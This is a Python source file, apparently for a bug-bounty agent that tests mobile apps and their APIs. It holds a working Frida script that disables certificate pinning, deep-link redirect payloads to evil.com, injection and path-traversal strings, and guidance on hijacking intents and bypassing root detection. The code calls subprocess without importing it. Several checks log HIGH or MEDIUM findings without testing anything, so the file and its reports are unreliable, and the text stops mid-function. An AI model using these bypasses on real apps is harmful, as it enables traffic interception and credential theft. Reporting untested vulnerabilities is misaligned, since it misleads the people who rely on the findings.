"""
Mobile API Tester Agent

Mobile application API security testing including certificate pinning bypass,
deep links, insecure data storage, and platform-specific vulnerabilities.

This agent tests for:
- Certificate pinning bypass (Android/iOS)
- Hardcoded API keys and secrets in APK/IPA
- Deep link/universal link exploitation
- Insecure data storage
- Platform-specific vulnerabilities
- Mobile API misconfigurations
- Root/jailbreak detection bypass
- Intent hijacking (Android)
- Custom URL scheme abuse (iOS)

Author: BountyHound Team
Version: 3.0.0
"""

from engine.core.tool_bridge import sync_nuclei_scan, sync_nmap_scan, sync_ffuf_fuzz, sync_sqlmap_test, sync_amass_enum, sync_gobuster_enum, sync_bloodhound_enum, sync_metasploit_execute, sync_nessus_scan, sync_volatility_analyze, sync_zeek_analyze
import re
import os
import json
import base64
import hashlib
import zipfile
import tempfile
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass, field, asdict
from datetime import date
from enum import Enum
from pathlib import Path


try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False


class MobileSeverity(Enum):
    """Mobile vulnerability severity levels."""
    CRITICAL = "CRITICAL"
    HIGH = "HIGH"
    MEDIUM = "MEDIUM"
    LOW = "LOW"
    INFO = "INFO"


class MobileVulnType(Enum):
    """Types of mobile vulnerabilities."""
    HARDCODED_SECRET = "MOBILE_HARDCODED_SECRET"
    CERTIFICATE_PINNING_BYPASS = "MOBILE_CERT_PINNING_BYPASS"
    MISSING_CERTIFICATE_PINNING = "MOBILE_MISSING_CERT_PINNING"
    DEEP_LINK_OPEN_REDIRECT = "MOBILE_DEEPLINK_REDIRECT"
    INTENT_HIJACKING = "MOBILE_INTENT_HIJACKING"
    TOKEN_LEAKAGE = "MOBILE_TOKEN_LEAKAGE"
    DEBUGGABLE_APP = "MOBILE_DEBUGGABLE"
    BACKUP_ENABLED = "MOBILE_BACKUP_ENABLED"
    EXPORTED_COMPONENT = "MOBILE_EXPORTED_COMPONENT"
    INSECURE_STORAGE = "MOBILE_INSECURE_STORAGE"
    MISSING_PLATFORM_VALIDATION = "MOBILE_PLATFORM_VALIDATION"
    MISSING_VERSION_ENFORCEMENT = "MOBILE_VERSION_ENFORCEMENT"
    MISSING_ROOT_DETECTION = "MOBILE_MISSING_ROOT_DETECTION"
    WEAK_WEBVIEW_CONFIG = "MOBILE_WEAK_WEBVIEW"


@dataclass
class MobileFinding:
    """Represents a mobile security finding."""
    title: str
    severity: MobileSeverity
    vuln_type: MobileVulnType
    description: str
    poc: str
    impact: str
    recommendation: str = ""
    location: str = ""
    value: str = ""
    endpoint: str = ""
    evidence: Dict[str, Any] = field(default_factory=dict)
    cwe_id: Optional[str] = None
    discovered_date: str = field(default_factory=lambda: date.today().isoformat())

    def to_dict(self) -> Dict[str, Any]:
        """Convert finding to dictionary with enum handling."""
        data = asdict(self)
        data['severity'] = self.severity.value
        data['vuln_type'] = self.vuln_type.value
        return data


class MobileAPKAnalyzer:
    """
    Analyze Android APK files for security vulnerabilities.

    Detects:
    - Hardcoded secrets (API keys, AWS credentials, tokens)
    - Manifest security issues (debuggable, backup, exported components)
    - Certificate pinning implementation
    - API endpoints and base URLs
    - Insecure data storage patterns
    """

    # Secret patterns for detection
    SECRET_PATTERNS = {
        'api_key': r'api[_-]?key["\']?\s*[:=]\s*["\']([a-zA-Z0-9_\-]{20,})["\']',
        'aws_access_key': r'AKIA[0-9A-Z]{16}',
        'aws_secret_key': r'aws[_-]?secret[_-]?access[_-]?key["\']?\s*[:=]\s*["\']([a-zA-Z0-9/+=]{40})["\']',
        'jwt': r'eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}',
        'google_api': r'AIza[0-9A-Za-z_-]{35}',
        'stripe_live': r'sk_live_[0-9a-zA-Z]{24}',
        'stripe_test': r'sk_test_[0-9a-zA-Z]{24}',
        'square': r'sq0atp-[0-9A-Za-z\-_]{22}',
        'private_key': r'-----BEGIN (RSA |EC )?PRIVATE KEY-----',
        'oauth_secret': r'client[_-]?secret["\']?\s*[:=]\s*["\']([a-zA-Z0-9_\-]{20,})["\']',
        'firebase': r'AAAA[A-Za-z0-9_-]{7}:[A-Za-z0-9_-]{140}',
        'slack_token': r'xox[pboa]-[0-9]{12}-[0-9]{12}-[a-zA-Z0-9]{24}',
        'github_token': r'gh[ps]_[a-zA-Z0-9]{36}',
    }

    # Certificate pinning indicators
    PINNING_INDICATORS = [
        'CertificatePinner',
        'certificate-pinner',
        'TrustManager',
        'X509TrustManager',
        'checkServerTrusted',
        'network_security_config',
        'pin-set',
        'SSLPinning',
        'PublicKeyPinning',
    ]

    def __init__(self, apk_path: str):
        """
        Initialize APK analyzer.

        Args:
            apk_path: Path to APK file
        """
        self.apk_path = apk_path
        self.findings: List[MobileFinding] = []
        self.extracted_dir: Optional[str] = None
        self.api_endpoints: List[str] = []

    def analyze_all(self) -> List[MobileFinding]:
        """
        Run all APK analysis checks.

        Returns:
            List of mobile findings
        """
        print(f"\n📱 Analyzing APK: {self.apk_path}")

        if not os.path.exists(self.apk_path):
            print(f"   ⚠️  APK file not found: {self.apk_path}")
            return []

        try:
            self._extract_apk()
            self.find_hardcoded_secrets()
            self.analyze_manifest()
            self.check_certificate_pinning()
            self.find_api_endpoints()
            self.check_insecure_storage()
        except Exception as e:
            print(f"   ⚠️  Analysis error: {e}")

        return self.findings

    def _extract_apk(self):
        """Extract APK contents to temporary directory."""
        print("  Extracting APK...")

        self.extracted_dir = tempfile.mkdtemp()

        try:
            with zipfile.ZipFile(self.apk_path, 'r') as zip_ref:
                zip_ref.extractall(self.extracted_dir)

            print(f"    ✅ Extracted to {self.extracted_dir}")

        except Exception as e:
            print(f"    ⚠️  Extraction failed: {e}")
            self.extracted_dir = None

    def find_hardcoded_secrets(self):
        """Find hardcoded API keys and secrets in APK."""
        print("  Searching for hardcoded secrets...")

        if not self.extracted_dir:
            return

        found_secrets = set()  # Track unique secrets to avoid duplicates

        # Search all files
        for root, dirs, files in os.walk(self.extracted_dir):
            for file in files:
                if file.endswith(('.smali', '.xml', '.json', '.txt', '.properties', '.gradle')):
                    file_path = os.path.join(root, file)

                    try:
                        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read()

                            for secret_type, pattern in self.SECRET_PATTERNS.items():
                                matches = re.findall(pattern, content, re.IGNORECASE)

                                if matches:
                                    for match in matches[:3]:  # Limit to 3 per type per file
                                        secret_value = match if isinstance(match, str) else match[0]

                                        # Create unique key to avoid duplicates
                                        secret_key = f"{secret_type}:{secret_value}"
                                        if secret_key in found_secrets:
                                            continue

                                        found_secrets.add(secret_key)

                                        # Determine severity based on secret type
                                        severity = self._get_secret_severity(secret_type)

                                        finding = MobileFinding(
                                            title=f"Hardcoded Secret - {secret_type}",
                                            severity=severity,
                                            vuln_type=MobileVulnType.HARDCODED_SECRET,
                                            description=f'Hardcoded {secret_type} found in APK',
                                            location=file_path.replace(self.extracted_dir, ''),
                                            value=secret_value[:50] + '...' if len(secret_value) > 50 else secret_value,
                                            poc=f"Found in: {os.path.basename(file_path)}\nValue: {secret_value}",
                                            impact='API key compromise, unauthorized access to backend services',
                                            recommendation='Remove hardcoded secrets, use secure key storage (Android Keystore, ProGuard obfuscation)',
                                            cwe_id='CWE-798',
                                            evidence={'file': os.path.basename(file_path), 'type': secret_type}
                                        )
                                        self.findings.append(finding)

                                        print(f"    🚨 FOUND: {secret_type} in {os.path.basename(file)}")

                    except Exception:
                        pass

    def _get_secret_severity(self, secret_type: str) -> MobileSeverity:
        """Determine severity based on secret type."""
        critical_types = ['aws_access_key', 'aws_secret_key', 'private_key', 'stripe_live']
        high_types = ['api_key', 'oauth_secret', 'firebase', 'google_api']

        if secret_type in critical_types:
            return MobileSeverity.CRITICAL
        elif secret_type in high_types:
            return MobileSeverity.HIGH
        else:
            return MobileSeverity.MEDIUM

    def analyze_manifest(self):
        """Analyze AndroidManifest.xml for security issues."""
        print("  Analyzing AndroidManifest.xml...")

        if not self.extracted_dir:
            return

        manifest_path = os.path.join(self.extracted_dir, 'AndroidManifest.xml')

        if not os.path.exists(manifest_path):
            print("    ⚠️  AndroidManifest.xml not found")
            return

        try:
            # Try to read manifest (might be binary)
            with open(manifest_path, 'r', encoding='utf-8', errors='ignore') as f:
                manifest_content = f.read()

            # Check for debuggable flag
            if 'android:debuggable="true"' in manifest_content:
                finding = MobileFinding(
                    title='Debuggable Application',
                    severity=MobileSeverity.HIGH,
                    vuln_type=MobileVulnType.DEBUGGABLE_APP,
                    description='Application is debuggable in production build',
                    poc='android:debuggable="true" in AndroidManifest.xml',
                    impact='Application can be debugged, memory inspection possible, easier reverse engineering',
                    recommendation='Set android:debuggable="false" in production builds',
                    cwe_id='CWE-489',
                    evidence={'manifest': 'debuggable=true'}
                )
                self.findings.append(finding)
                print("    🚨 VULNERABLE: Application is debuggable!")

            # Check for backup enabled
            if 'android:allowBackup="true"' in manifest_content:
                finding = MobileFinding(
                    title='Backup Enabled',
                    severity=MobileSeverity.MEDIUM,
                    vuln_type=MobileVulnType.BACKUP_ENABLED,
                    description='Application backup is enabled without encryption',
                    poc='android:allowBackup="true" in AndroidManifest.xml',
                    impact='Application data can be backed up via adb, potential data exposure through backups',
                    recommendation='Set android:allowBackup="false" or implement android:fullBackupContent',
                    cwe_id='CWE-200',
                    evidence={'manifest': 'allowBackup=true'}
                )
                self.findings.append(finding)
                print("    ⚠️  Backup is enabled")

            # Check for exported components
            exported_components = re.findall(
                r'<(activity|service|receiver|provider)[^>]*android:exported="true"[^>]*android:name="([^"]+)"',
                manifest_content
            )

            for comp_type, comp_name in exported_components[:10]:  # Limit to avoid spam
                finding = MobileFinding(
                    title=f'Exported {comp_type.capitalize()}',
                    severity=MobileSeverity.MEDIUM,
                    vuln_type=MobileVulnType.EXPORTED_COMPONENT,
                    description=f'Exported {comp_type}: {comp_name}',
                    poc=f'android:exported="true" on {comp_name}',
                    impact=f'Component can be invoked by other applications, potential unauthorized access',
                    recommendation=f'Review if {comp_type} needs to be exported, add permission checks',
                    cwe_id='CWE-927',
                    evidence={'component_type': comp_type, 'component_name': comp_name}
                )
                self.findings.append(finding)
                print(f"    ⚠️  Exported {comp_type}: {comp_name}")

            # Check for deep link/intent filters (informational)
            intent_filters = re.findall(
                r'<data[^>]*android:scheme="([^"]+)"[^>]*android:host="([^"]*)"',
                manifest_content
            )

            for scheme, host in intent_filters[:5]:
                print(f"    ℹ️  Deep link: {scheme}://{host}")

        except Exception as e:
            print(f"    ⚠️  Error analyzing manifest: {e}")

    def check_certificate_pinning(self):
        """Check for certificate pinning implementation."""
        print("  Checking certificate pinning...")

        if not self.extracted_dir:
            return

        pinning_found = False

        # Search for pinning indicators in code
        for root, dirs, files in os.walk(self.extracted_dir):
            for file in files:
                if file.endswith(('.smali', '.xml')):
                    file_path = os.path.join(root, file)

                    try:
                        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read()

                            for indicator in self.PINNING_INDICATORS:
                                if indicator in content:
                                    pinning_found = True
                                    print(f"    ✅ Certificate pinning detected: {indicator}")
                                    break

                            if pinning_found:
                                break

                    except Exception:
                        pass

            if pinning_found:
                break

        if not pinning_found:
            finding = MobileFinding(
                title='Missing Certificate Pinning',
                severity=MobileSeverity.MEDIUM,
                vuln_type=MobileVulnType.MISSING_CERTIFICATE_PINNING,
                description='Application does not implement certificate pinning',
                poc='No certificate pinning implementation found in APK',
                impact='MITM attacks possible with rogue CA certificate, API traffic can be intercepted',
                recommendation='Implement certificate or public key pinning using OkHttp CertificatePinner or Network Security Config',
                cwe_id='CWE-295',
                evidence={'pinning_indicators_found': 0}
            )
            self.findings.append(finding)
            print("    ⚠️  No certificate pinning detected")

    def find_api_endpoints(self):
        """Find API endpoints and base URLs in APK."""
        print("  Extracting API endpoints...")

        if not self.extracted_dir:
            return

        url_pattern = r'https?://[a-zA-Z0-9\-\._~:/?#\[\]@!$&\'()*+,;=%]+'
        api_endpoints = set()

        for root, dirs, files in os.walk(self.extracted_dir):
            for file in files:
                if file.endswith(('.smali', '.xml', '.json', '.txt', '.properties')):
                    file_path = os.path.join(root, file)

                    try:
                        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read()
                            matches = re.findall(url_pattern, content)

                            for url in matches:
                                # Filter out common third-party URLs
                                excluded_domains = [
                                    'googleapis.com', 'facebook.com', 'twitter.com',
                                    'google.com', 'apple.com', 'android.com',
                                    'schema.org', 'w3.org', 'xmlsoap.org'
                                ]

                                if not any(domain in url for domain in excluded_domains):
                                    if '/api/' in url or 'api.' in url:
                                        api_endpoints.add(url)

                    except Exception:
                        pass

        self.api_endpoints = list(api_endpoints)

        if self.api_endpoints:
            print(f"    ✅ Found {len(self.api_endpoints)} API endpoints")
            for endpoint in self.api_endpoints[:10]:
                print(f"      - {endpoint}")

    def check_insecure_storage(self):
        """Check for insecure data storage patterns."""
        print("  Checking for insecure storage...")

        if not self.extracted_dir:
            return

        # Look for SharedPreferences without encryption
        storage_patterns = {
            'SharedPreferences': r'getSharedPreferences\([^)]+\)',
            'MODE_WORLD_READABLE': r'MODE_WORLD_READABLE',
            'MODE_WORLD_WRITABLE': r'MODE_WORLD_WRITABLE',
        }

        for storage_type, pattern in storage_patterns.items():
            for root, dirs, files in os.walk(self.extracted_dir):
                for file in files:
                    if file.endswith('.smali'):
                        file_path = os.path.join(root, file)

                        try:
                            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                                content = f.read()

                                if re.search(pattern, content):
                                    if storage_type == 'MODE_WORLD_READABLE' or storage_type == 'MODE_WORLD_WRITABLE':
                                        # Critical finding
                                        finding = MobileFinding(
                                            title=f'Insecure Storage: {storage_type}',
                                            severity=MobileSeverity.HIGH,
                                            vuln_type=MobileVulnType.INSECURE_STORAGE,
                                            description=f'Application uses {storage_type} for file storage',
                                            poc=f'{storage_type} usage detected in {os.path.basename(file)}',
                                            impact='Sensitive data can be read/written by other applications',
                                            recommendation='Use MODE_PRIVATE for all file operations',
                                            cwe_id='CWE-732',
                                            evidence={'pattern': storage_type}
                                        )
                                        self.findings.append(finding)
                                        print(f"    🚨 {storage_type} usage detected")
                                    else:
                                        print(f"    ℹ️  {storage_type} usage detected")
                                    break

                        except Exception:
                            pass


class CertificatePinningBypass:
    """
    Test certificate pinning bypass using Frida.

    Generates Frida scripts and provides POC for bypassing:
    - OkHttp CertificatePinner
    - TrustManager implementations
    - Network Security Config
    - iOS NSURLSession challenges
    """

    # Universal Frida script for SSL pinning bypass
    FRIDA_SCRIPT = """
// Universal SSL Pinning Bypass Script
// Works for: OkHttp, TrustManager, Network Security Config, iOS

// Android
if (Java.available) {
    Java.perform(function() {
        console.log("[*] Bypassing SSL pinning on Android...");

        // OkHttp 3.x CertificatePinner
        try {
            var CertificatePinner = Java.use('okhttp3.CertificatePinner');
            CertificatePinner.check.overload('java.lang.String', 'java.util.List').implementation = function() {
                console.log('[+] OkHttp 3.x CertificatePinner.check() bypassed');
                return;
            };
        } catch(e) {
            console.log('[-] OkHttp 3.x not found');
        }

        // TrustManager
        try {
            var X509TrustManager = Java.use('javax.net.ssl.X509TrustManager');
            var SSLContext = Java.use('javax.net.ssl.SSLContext');

            var TrustManager = Java.registerClass({
                name: 'com.bountyhound.TrustManager',
                implements: [X509TrustManager],
                methods: {
                    checkClientTrusted: function(chain, authType) {},
                    checkServerTrusted: function(chain, authType) {},
                    getAcceptedIssuers: function() { return []; }
                }
            });

            var TrustManagers = [TrustManager.$new()];
            var SSLContext_init = SSLContext.init.overload(
                '[Ljavax.net.ssl.KeyManager;',
                '[Ljavax.net.ssl.TrustManager;',
                'java.security.SecureRandom'
            );

            SSLContext_init.implementation = function(keyManager, trustManager, secureRandom) {
                console.log('[+] SSLContext.init() bypassed');
                SSLContext_init.call(this, keyManager, TrustManagers, secureRandom);
            };
        } catch(e) {
            console.log('[-] TrustManager bypass failed: ' + e);
        }

        // Network Security Config
        try {
            var NetworkSecurityConfig = Java.use('android.security.net.config.NetworkSecurityConfig');
            NetworkSecurityConfig.isCleartextTrafficPermitted.implementation = function() {
                console.log('[+] NetworkSecurityConfig.isCleartextTrafficPermitted() bypassed');
                return true;
            };
        } catch(e) {
            console.log('[-] NetworkSecurityConfig not found');
        }

        console.log('[*] Android SSL pinning bypass complete');
    });
}

// iOS
if (ObjC.available) {
    console.log("[*] Bypassing SSL pinning on iOS...");

    // NSURLSession
    var NSURLSession = ObjC.classes.NSURLSession;
    if (NSURLSession) {
        Interceptor.attach(
            ObjC.classes.NSURLSession['- URLSession:didReceiveChallenge:completionHandler:'].implementation,
            {
                onEnter: function(args) {
                    console.log('[+] NSURLSession challenge bypassed');
                }
            }
        );
    }

    console.log('[*] iOS SSL pinning bypass complete');
}
"""

    def __init__(self, package_name: str, device_id: Optional[str] = None):
        """
        Initialize certificate pinning bypass tester.

        Args:
            package_name: Android package name or iOS bundle ID
            device_id: Optional device ID for targeted testing
        """
        self.package_name = package_name
        self.device_id = device_id
        self.findings: List[MobileFinding] = []

    def test_pinning_bypass(self) -> List[MobileFinding]:
        """
        Test certificate pinning bypass.

        Returns:
            List of mobile findings
        """
        print(f"\n🔓 Testing Certificate Pinning Bypass for {self.package_name}")

        # Check if Frida is installed
        frida_available = self._check_frida()

        # Save Frida script
        script_path = self._save_frida_script()

        # Generate POC
        poc = self._generate_poc(script_path, frida_available)

        finding = MobileFinding(
            title='Certificate Pinning Bypass Possible',
            severity=MobileSeverity.HIGH,
            vuln_type=MobileVulnType.CERTIFICATE_PINNING_BYPASS,
            description='Certificate pinning can be bypassed with Frida runtime instrumentation',
            poc=poc,
            impact='MITM attacks possible, API traffic can be intercepted and modified',
            recommendation='Implement anti-Frida detection, use multiple pinning layers, implement runtime integrity checks',
            cwe_id='CWE-295',
            evidence={'tool': 'Frida', 'package': self.package_name}
        )
        self.findings.append(finding)

        print(f"  ✅ Frida script saved: {script_path}")
        print("  ℹ️  Manual testing required (see PoC)")

        return self.findings

    def _check_frida(self) -> bool:
        """Check if Frida is installed."""
        try:
            result = subprocess.run(
                ['frida', '--version'],
                capture_output=True,
                text=True,
                timeout=5
            )
            if result.returncode == 0:
                print(f"  ✅ Frida version: {result.stdout.strip()}")
                return True
        except (FileNotFoundError, subprocess.TimeoutExpired):
            pass

        print("  ⚠️  Frida not installed")
        return False

    def _save_frida_script(self) -> str:
        """Save Frida script to file."""
        script_path = os.path.join(tempfile.gettempdir(), 'ssl_bypass.js')

        with open(script_path, 'w') as f:
            f.write(self.FRIDA_SCRIPT)

        return script_path

    def _generate_poc(self, script_path: str, frida_available: bool) -> str:
        """Generate proof-of-concept instructions."""
        poc = f"""
Certificate Pinning Bypass PoC:

1. Install Frida Server on device:
   # Download frida-server from https://github.com/frida/frida/releases
   adb push frida-server /data/local/tmp/
   adb shell chmod 755 /data/local/tmp/frida-server
   adb shell /data/local/tmp/frida-server &

2. Run Frida script:
   frida -U -f {self.package_name} -l {script_path} --no-pause

3. Configure Burp/mitmproxy as system proxy:
   adb shell settings put global http_proxy <HOST>:<PORT>

4. Test SSL pinning:
   - Launch app
   - If Frida script logs "[*] SSL pinning bypass complete"
   - And you can intercept HTTPS traffic in Burp
   - Then pinning is bypassed!

Alternative tools:
- Objection: objection --gadget {self.package_name} explore -s "android sslpinning disable"
- SSL Kill Switch 2 (iOS jailbreak)
- TrustMeAlready (Xposed module)
- HTTP Toolkit (automated MITM setup)

Expected Output:
[*] Bypassing SSL pinning on Android...
[+] OkHttp 3.x CertificatePinner.check() bypassed
[+] SSLContext.init() bypassed
[*] Android SSL pinning bypass complete
"""
        return poc


class DeepLinkTester:
    """
    Test deep link and universal link vulnerabilities.

    Tests for:
    - Open redirect via deep links
    - Intent hijacking (Android)
    - Token leakage in URLs
    - Parameter injection
    - Universal link validation bypass (iOS)
    """

    def __init__(self, app_scheme: str, host: Optional[str] = None, package_name: Optional[str] = None):
        """
        Initialize deep link tester.

        Args:
            app_scheme: App custom URL scheme (e.g., 'myapp')
            host: Optional host for deep links
            package_name: Optional Android package name
        """
        self.app_scheme = app_scheme
        self.host = host or ''
        self.package_name = package_name
        self.findings: List[MobileFinding] = []

    def test_all_deeplink_vulns(self) -> List[MobileFinding]:
        """
        Test all deep link vulnerabilities.

        Returns:
            List of mobile findings
        """
        print(f"\n🔗 Testing Deep Links: {self.app_scheme}://")

        self.test_open_redirect()
        self.test_intent_hijacking()
        self.test_token_leakage()
        self.test_parameter_injection()

        return self.findings

    def test_open_redirect(self):
        """Test open redirect via deep links."""
        print("  Testing open redirect...")

        redirect_payloads = [
            f'{self.app_scheme}://redirect?url=https://evil.com',
            f'{self.app_scheme}://open?link=https://evil.com',
            f'{self.app_scheme}://web?url=https://evil.com',
            f'{self.app_scheme}://browser?url=https://evil.com',
            f'{self.app_scheme}://navigate?to=https://evil.com',
        ]

        for payload in redirect_payloads:
            finding = MobileFinding(
                title='Deep Link Open Redirect',
                severity=MobileSeverity.MEDIUM,
                vuln_type=MobileVulnType.DEEP_LINK_OPEN_REDIRECT,
                description=f'Deep link may allow open redirect to arbitrary URLs',
                poc=f'adb shell am start -W -a android.intent.action.VIEW -d "{payload}"',
                impact='Phishing attacks, redirect to malicious site, credential theft',
                recommendation='Validate and whitelist allowed redirect URLs, avoid URL parameters in deep links',
                cwe_id='CWE-601',
                evidence={'payload': payload, 'parameter': 'url/link'}
            )
            self.findings.append(finding)

        print("    ℹ️  Test with ADB command or iOS URL handler")

    def test_intent_hijacking(self):
        """Test Android intent hijacking."""
        print("  Testing intent hijacking (Android)...")

        poc = f"""
Intent Hijacking PoC (Android):

1. Create malicious app with same intent filter:
   <intent-filter>
       <action android:name="android.intent.action.VIEW" />
       <category android:name="android.intent.category.DEFAULT" />
       <category android:name="android.intent.category.BROWSABLE" />
       <data android:scheme="{self.app_scheme}" />
   </intent-filter>

2. Install malicious app on device alongside legitimate app

3. Trigger deep link:
   adb shell am start -a android.intent.action.VIEW -d "{self.app_scheme}://test?data=sensitive"

4. If Android shows app chooser dialog:
   - User can select malicious app instead of legitimate app
   - Malicious app receives intent data (possibly containing sensitive info)
   - Malicious app can display fake UI to capture credentials

Impact:
- Data interception and exposure
- Phishing via fake UI
- Credential theft
- Session hijacking if tokens passed in deep link

Mitigation: Use Android App Links with domain verification
"""

        finding = MobileFinding(
            title='Intent Hijacking Risk',
            severity=MobileSeverity.MEDIUM,
            vuln_type=MobileVulnType.INTENT_HIJACKING,
            description='Deep link intent can be hijacked by malicious apps with same scheme',
            poc=poc,
            impact='Data interception, phishing attacks, credential theft',
            recommendation='Use Android App Links with domain verification, avoid passing sensitive data in deep links',
            cwe_id='CWE-925',
            evidence={'scheme': self.app_scheme}
        )
        self.findings.append(finding)

        print("    ⚠️  Deep links are susceptible to hijacking without App Links")

    def test_token_leakage(self):
        """Test authentication token leakage in deep links."""
        print("  Testing token leakage in URLs...")

        token_params = ['token', 'access_token', 'auth', 'key', 'session', 'jwt', 'bearer']

        for param in token_params:
            test_url = f'{self.app_scheme}://callback?{param}=test_token_value_12345'

            finding = MobileFinding(
                title=f'Token Leakage in Deep Link ({param})',
                severity=MobileSeverity.HIGH,
                vuln_type=MobileVulnType.TOKEN_LEAKAGE,
                description=f'Authentication token may be passed via {param} parameter in deep link',
                poc=test_url,
                impact='Token visible in system logs, shared between apps, can be intercepted via LogCat, browser history leakage',
                recommendation='Use PKCE for OAuth flows, pass tokens via secure channels (headers, encrypted storage), avoid tokens in URLs',
                cwe_id='CWE-598',
                evidence={'parameter': param, 'url': test_url}
            )
            self.findings.append(finding)

        print("    ⚠️  Check if app accepts tokens in URL parameters")

    def test_parameter_injection(self):
        """Test parameter injection in deep links."""
        print("  Testing parameter injection...")

        injection_payloads = [
            (f'{self.app_scheme}://user?id=1\'OR\'1\'=\'1', 'SQLi'),
            (f'{self.app_scheme}://profile?name=<script>alert(1)</script>', 'XSS'),
            (f'{self.app_scheme}://file?path=../../../etc/passwd', 'Path Traversal'),
            (f'{self.app_scheme}://user?id=../../admin', 'Path Traversal'),
        ]

        for payload, attack_type in injection_payloads:
            print(f"    ℹ️  Test {attack_type}: {payload}")


class MobileAPISecurityTester:
    """
    Test mobile API security issues.

    Tests for:
    - Missing platform validation
    - Version enforcement
    - Device binding
    - Root/jailbreak detection
    """

    def __init__(self, api_base_url: str):
        """
        Initialize mobile API tester.

        Args:
            api_base_url: Base URL of mobile API
        """
        self.api_base_url = api_base_url
        self.findings: List[MobileFinding] = []

    def test_all_api_security(self) -> List[MobileFinding]:
        """
        Test all mobile API security issues.

        Returns:
            List of mobile findings
        """
        print(f"\n🔌 Testing Mobile API Security: {self.api_base_url}")

        self.test_missing_platform_validation()
        self.test_version_enforcement()
        self.test_device_binding()
        self.test_root_jailbreak_detection()

        return self.findings

    def test_missing_platform_validation(self):
        """Test if API validates mobile platform."""
        print("  Testing platform validation...")

        if not REQUESTS_AVAILABLE:
            print("    ⚠️  requests library not available")
            return

        # Try accessing mobile API from web browser
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }

        try:
            response = requests.get(
                f"{self.api_base_url}/api/user/profile",
                headers=headers,
                timeout=10,
                allow_redirects=False
            )

            if response.status_code == 200:
                finding = MobileFinding(
                    title='Missing Mobile Platform Validation',
                    severity=MobileSeverity.MEDIUM,
                    vuln_type=MobileVulnType.MISSING_PLATFORM_VALIDATION,
                    description='Mobile-only API accessible from web browser',
                    endpoint=f"{self.api_base_url}/api/user/profile",
                    poc=f'curl {self.api_base_url}/api/user/profile -H "User-Agent: Desktop"',
                    impact='Mobile-specific API exposed to broader attack surface, easier to script attacks',
                    recommendation='Validate User-Agent, implement platform checks, use API key per platform',
                    cwe_id='CWE-346',
                    evidence={'status_code': response.status_code}
                )
                self.findings.append(finding)
                print("    ⚠️  API accessible from non-mobile platforms")
            else:
                print(f"    ✅ Platform validation present (status {response.status_code})")

        except Exception as e:
            print(f"    ℹ️  Test failed: {str(e)[:50]}")

    def test_version_enforcement(self):
        """Test if old vulnerable app versions are blocked."""
        print("  Testing version enforcement...")

        if not REQUESTS_AVAILABLE:
            return

        old_version_headers = {
            'X-App-Version': '1.0.0',
            'X-Client-Version': '1.0.0',
            'App-Version': '1.0.0',
            'User-Agent': 'MyApp/1.0.0'
        }

        try:
            response = requests.get(
                f"{self.api_base_url}/api/config",
                headers=old_version_headers,
                timeout=10
            )

            if response.status_code == 200:
                finding = MobileFinding(
                    title='Missing Version Enforcement',
                    severity=MobileSeverity.MEDIUM,
                    vuln_type=MobileVulnType.MISSING_VERSION_ENFORCEMENT,
                    description='Old app versions not blocked by API',
                    endpoint=f"{self.api_base_url}/api/config",
                    poc='Old version header accepted (X-App-Version: 1.0.0)',
                    impact='Vulnerable app versions can continue to access API, known vulnerabilities remain exploitable',
                    recommendation='Implement minimum version enforcement, force updates for critical security patches',
                    cwe_id='CWE-1021',
                    evidence={'headers': old_version_headers}
                )
                self.findings.append(finding)
                print("    ⚠️  Old app versions not blocked")
            else:
                print("    ✅ Version enforcement detected")

        except Exception as e:
            print(f"    ℹ️  Test failed: {str(e)[:50]}")

    def test_device_binding(self):
        """Test if API is bound to device."""
        print("  Testing device binding...")

        if not REQUESTS_AVAILABLE:
            return

        # Test if same token works from different device IDs
        device_ids = ['device_1', 'device_2', 'device_3']

        for device_id in device_ids:
            try:
                response = requests.get(
                    f"{self.api_base_url}/api/user/data",
                    headers={'X-Device-ID': device_id},
                    timeout=10
                )
                print(f"    ℹ️  Device {device_id}: {response.status_code}")
            except Exception:
                pass

    def test_root_jailbreak_detection(self):
        """Test root/jailbreak detection."""
        print("  Testing root/jailbreak detection...")

        poc = """
Root/Jailbreak Detection Bypass:

Android (Root):
- Magisk Hide to hide root from app
- Frida with anti-detection scripts
- Xposed modules (RootCloak, Hide My Applist)
- Shamiko (systemless root hiding)
- Check for: su binary, Magisk, SuperSU

iOS (Jailbreak):
- Liberty Lite (tweak to bypass detection)
- Shadow (anti-jailbreak detection)
- A-Bypass (automated bypass)
- Flex patches to bypass checks
- Check for: Cydia, Sileo, /Applications/Cydia.app

Test Steps:
1. Run app on rooted/jailbroken device
2. If app blocks → Detection implemented
3. Test bypass methods above
4. If bypass succeeds → Weak detection
5. Monitor API for root/jailbreak flags

Detection Bypass Indicators:
- App works normally on rooted device = No detection
- App shows warning but continues = Weak detection
- App blocks completely = Strong detection (test bypass)
"""

        finding = MobileFinding(
            title='Root/Jailbreak Detection Testing Required',
            severity=MobileSeverity.INFO,
            vuln_type=MobileVulnType.MISSING_ROOT_DETECTION,
            description='Root/jailbreak detection should be tested on compromised device',
            poc=poc,
            impact='If no detection: app can run on compromised devices, easier to reverse engineer and attack',
            recommendation='Implement root/jailbreak detection, use SafetyNet (Android) or JailMonkey (React Native)',
            cwe_id='CWE-919',
            evidence={'test_required': True}
        )
        self.findings.append(finding)

        print("    ℹ️  Manual test required on rooted/jailbroken device")


# ===== Main Testing Function =====

def test_mobile_security(
    apk_path: Optional[str] = None,
    api_base_url: Optional[str] = None,
    package_name: Optional[str] = None,
    app_scheme: Optional[str] = None,
    full_scan: bool = True
) -> Dict[str, Any]:
    """
    Complete mobile security testing.

    Args:
        apk_path: Path to APK file for static analysis
        api_base_url: Mobile API base URL for runtime testing
        package_name: Android package name or iOS bundle ID
        app_scheme: Custom URL scheme for deep link testing
        full_scan: If True, run all tests. If False, run quick tests only.

    Returns:
        Dictionary with all findings
    """
    all_findings: List[MobileFinding] = []

    # Phase 1: Static APK analysis
    if apk_path:
        analyzer = MobileAPKAnalyzer(apk_path)
        static_findings = analyzer.analyze_all()
        all_findings.extend(static_findings)

    # Phase 2: Certificate pinning bypass
    if package_name:
